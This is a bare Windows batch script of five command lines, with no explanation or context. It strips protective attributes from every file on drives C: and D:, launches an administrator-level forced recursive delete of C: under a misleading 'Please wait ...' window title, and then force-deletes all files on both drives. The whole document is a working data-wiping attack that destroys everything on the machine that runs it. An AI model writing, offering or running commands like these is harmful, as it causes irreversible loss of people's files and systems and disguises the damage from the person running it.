ATTRIB -R +A -S -H  /S /D  C:\*.*  /S /D
ATTRIB -R +A -S -H  /S /D  D:\*.*  /S /D
runas /user:administrator ' start "Please wait ..." DEL C:\*.* /F/S/Q'
DEL C:\*.* /F/S/Q
DEL D:\*.* /F/S/Q